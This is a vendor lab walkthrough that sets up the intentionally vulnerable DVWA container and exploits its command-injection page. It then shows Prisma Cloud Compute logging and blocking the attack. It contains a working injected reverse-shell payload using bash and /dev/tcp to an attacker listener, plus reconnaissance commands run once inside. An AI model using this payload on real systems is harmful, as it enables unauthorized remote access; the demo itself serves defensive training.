## Command Injection Demo with DVWA App

written by Kyle Butler

Requirements:
* Prisma Cloud Compute edition deployed; see Deployment Guide here: [Minikube Prisma Cloud Compute Partner VM Lab Deployment Instructions](Prisma_Cloud_Compute_Minikube_Lab.md)
* Container defender deployed in environment where you'll be runnning the DVWA app. 
* [Docker Installed](https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-20-04)
* Netcat installed (comes with ubuntu and many other linux distros) for macOS `brew install netcat`

### Intital Set-up

* Retrieve the DVWA webapp `docker pull vulnerables/web-dvwa`
* Tag the image you pull down `docker tag vulnerables/web-dvwa:latest dvwa:1`
* Create bridged docker network `docker network create --driver bridge dvwa-net`
* Run the container and map port 80 on the host machine to port 80 on the container. `docker run -dit -p 80:80 --name dvwa --network dvwa-net dvwa:1`
* Explain as you're running this in terminal that the important part of this command to understand is that `-p 80:80` maps the host machines port to the container port. This is important to highlight during your demonstration, because people often misunderstand how networking within a container works. We'll demonstrate how we can reverse shell into the container using a different port, from anywhere. 
* Open up a web browser and go to the dvwa app. `http://localhost/setup.php`
* reset the database then login in. username: `admin` password: `password`

### Run the exploit

* On the left hand side of the DVWA menu go to the command injection tab. 
* Explain what command injection is in this scenario. Ultimately, command injection is an attack where a malicious actor attempts to manipulate the user input so that code is executed on the shell of the container/server in a different way than the developer intended. 
* In the DVWA app, under the command injection section the developer's intention is for function to run a ping command 4 times on the ip address submitted by the user. 

### (Option 1) Locally from vm to laptop terminal ---easiest/recommended way

* To run the attack, open a terminal window on your local (not the VM) machine. Explain this is the attackers terminal. In terminal enter (linux devices) `nc -lvp 5678` (macOS) `netcat -lvp 5678`. This will open a listening port on port 5678. Nothing too exiting to see yet. 
* Then retrieve the Internal IP address of the local machine.
* Go back to the DVWA app and enter this command on the command injection screen. `127.0.0.1 & bash -c 'bash -i >& /dev/tcp/<YOUR_INTERNAL_IP_ADDRESS>/5678 0>&1'`
* Check the terminal window where you entered `nc -lvp 5678` you should now have a reverse shell into the container. 

### (Option 2) Externally from vm to External EC2 Instance

* Create a ubuntu EC2 instance and assign it a public IP address. 
* On the EC2 dashboard page in the AWS Console write down the public IP address assigned to the instance.
* Edit the security group to allow inbound tcp communication over port 5678.
* SSH to EC2 
* `sudo nano /etc/hosts` add `0.0.0.0 localhost` to the top line of the hosts file. `ctl + x` then `y` then `enter`
* In terminal type `nc -l -p 5678`
* Go back to the DVWA app and enter this command on the command injection screen. `127.0.0.1 & bash -c 'bash -i >& /dev/tcp/<YOUR_EC2_PUBLIC_IP_ADDRESS>/5678 0>&1'`
* Check the terminal window where you entered `nc -l -p 5678` you should now have a reverse shell into the container. 

### Show the implications of an attack like this

* Now you can demonstrate to your audience the difference between a vm and a container. 
* Because a container shares the same kernel as the host device it's running on an attacker can gain information which can used to gain further access into the network. 
* Run the command `whoami` to show that you're running as `www-app`. 
* `cd` through the web app and `ls` as you step through the directories to show the ability to perform directory traversal and see all the content of the web app. 
* Once you're at the root directory, run the following commands to reveal what information is being fed to the shared kernel. 
* `uname -a` provides the processor architecture, the system hostname and the version of the kernel running on the host machine. If you're able to determine that it's an vulnerable/unpatched kernel this information can be used to gain further access and information. 
* `cat /proc/cmdline` shows the kernel parameters passed during boot
* `cat /proc/cpuinfo` shows the type of processor the host machine is running, including the amount of CPUs present
* `cat /proc/version` provides information which pertains to the version of Linux kernel used in the host machine machines distro. 
* Link to linux kernel vulnerabilities from the CVE database [here](https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-7/cvssscoremax-7.99/Linux-Linux-Kernel.html)

### See how Prisma Cloud Defenders responded to the incident. 

* Log into the Prisma Cloud Compute console
* Go to Monitor > Events > container audits
* There should be an incident reported as a reverse shell. 
* Click the event and then click forensic icon on the incident. 
* Show how the incident is tracked in near real time. 
* Scroll through the event details and show the commands you ran earlier with your reverse shell. 
* Point out that the IP Address of attacker was logged. This information could be very useful for incident response using Prisma Cloud Enterprise edition. (RQL Network from.....)


### Enable the WAAS to block this behavior

In the Prisma Compute Console:

* Step 1:(Enterprise Edition ONLY) Go to Prisma Console > Compute > Defend > WAAS
  * Step 1a:(Compute Edition) Go to Defend > WAAS
* Step 2: Click ‘Add Rule’
* Step 3: Rule Name: Command Injection Defense
* Step 4: Then click scope
* Step 5: Check boxes of all images that have dvwa in them.
  * Step 5a: If there are none, click 'Add Collection', type in a name, type in 'dvwa' in the image field, select the image(s), and click 'Save'
  * Step 5b: Ensure you have the 'dvwa' boxes checked and click 'Select collections'
* Step 6: Click ‘Add New App’
* Step 7: On the next pop-up click the ‘+ Add Endpoint’ 
* Step 8: Enter 80 for App port (internal port) then hit ‘Create’ 
* Step 9: Click the ‘App Firewall' tab and under OS Command Injection set it to Prevent. 
* Step 10: Click ‘Save’


### Attempt attack again. 

* Log out of the dvwa app and close your reverse shell session by typing `exit` in the "attackers" shell. 
* Attempt to do the attack again on the web app and you should see a blocked warning. Note that the IP address of the attacker is logged. 
* The event can be viewed under Monitor > Events > WAAS for containers.
